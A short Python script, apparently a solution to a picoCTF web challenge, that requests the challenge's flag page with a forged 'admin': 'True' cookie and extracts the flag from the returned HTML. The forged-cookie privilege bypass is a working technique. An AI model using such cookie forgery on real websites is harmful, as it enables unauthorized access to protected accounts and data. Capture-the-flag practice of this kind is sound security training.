import requests

url = "https://jupiter.challenges.picoctf.org/problem/44573/flag"

cookies = {'admin': "True"}

flag = requests.get(url, cookies=cookies).content.decode(
).splitlines()[-12].split(">")[-3].split("<")[0]

print(flag)
